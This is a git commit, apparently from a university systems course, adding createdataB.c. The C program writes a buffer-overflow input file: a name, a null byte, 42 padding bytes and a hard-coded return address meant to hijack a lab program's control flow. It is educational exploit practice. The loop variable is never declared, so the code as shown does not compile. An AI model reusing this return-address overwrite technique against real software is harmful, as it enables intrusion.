60af925a8b70ef474afee22929eb214f48ec9d78
Ehsan-Ib <ei8170@princeton.edu>
2026-04-30 21:59:45 -0400

    first try making stuff

---
+++ createdataB.c
@@ -0,0 +1,30 @@
+#include <stdio.h>
+
+int main(void) {
+    FILE *fp = fopen("dataB", "w");
+    
+    fputc('E', fp);
+    fputc('h', fp);
+    fputc('s', fp);
+    fputc('a', fp);
+    fputc('n', fp);
+    fputc('\0', fp);
+
+    for (i = 0; i < 42; i++) {
+        fputc('!', fp);
+    }
+
+    fputc(0x90, fp);
+    fputc(0x08, fp);
+    fputc(0x40, fp);
+    fputc(0x00, fp);
+    fputc(0x00, fp);
+    fputc(0x00, fp);
+    fputc(0x00, fp);
+    fputc(0x00, fp);
+
+    
+    
+    fclose(fp);
+    return 0;
+}
